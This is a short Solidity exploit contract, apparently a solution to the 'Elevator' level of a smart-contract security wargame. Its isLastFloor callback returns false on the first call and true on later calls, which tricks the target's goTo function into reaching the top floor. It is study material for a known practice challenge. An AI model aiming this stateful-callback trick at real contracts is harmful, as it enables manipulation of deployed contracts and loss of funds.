// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Elevator.sol";

contract ElevatorExploit {

    mapping(address => mapping (uint => bool)) public floorVisitedByAddress;
    Elevator public victimContract;

    constructor(address targetAddress) {
        victimContract = Elevator(payable(targetAddress));
    }

    // One first call from msg.sender set map to true that is was called once with this floor value
    function isLastFloor(uint floor) external returns (bool) {
        if(floorVisitedByAddress[msg.sender][floor]) {
            return true;
        }
        floorVisitedByAddress[msg.sender][floor] = true;
        return false;
    }

    function attack() external {
        victimContract.goTo(4);
    }
}